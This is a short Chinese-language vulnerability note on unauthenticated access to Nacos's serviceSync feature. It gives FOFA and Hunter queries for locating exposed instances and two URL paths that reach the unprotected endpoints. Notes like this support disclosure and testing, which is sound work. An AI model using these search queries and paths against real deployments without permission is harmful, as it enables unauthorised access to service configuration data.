# Nacos存在serviceSync未授权访问漏洞

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在serviceSync未授权访问漏洞</font>

# <font style="color:rgb(63, 63, 63);">二、影响版本</font>
+ <font style="color:rgb(63, 63, 63);">Nacos</font>

# <font style="color:rgb(63, 63, 63);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ fofa`app="NACOS"`
+ 特征

![1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937.png](./img/Mx_5qpYTCzuDrSL-/1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937-620456.png)

# 四、漏洞复现
```plain
/nacos/#/serviceSync
```

![1729426330695-15a37858-adda-4ca8-adb3-e7c967152baa.png](./img/Mx_5qpYTCzuDrSL-/1729426330695-15a37858-adda-4ca8-adb3-e7c967152baa-997048.png)

```plain
/v1/task/list?pageSize=10&pageNum=1
```

![1729426719698-3d63c9aa-96bf-421f-a764-e9f7374575f3.png](./img/Mx_5qpYTCzuDrSL-/1729426719698-3d63c9aa-96bf-421f-a764-e9f7374575f3-797790.png)



> 更新: 2024-10-28 15:59:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yx9zlsgguyq1p5v5>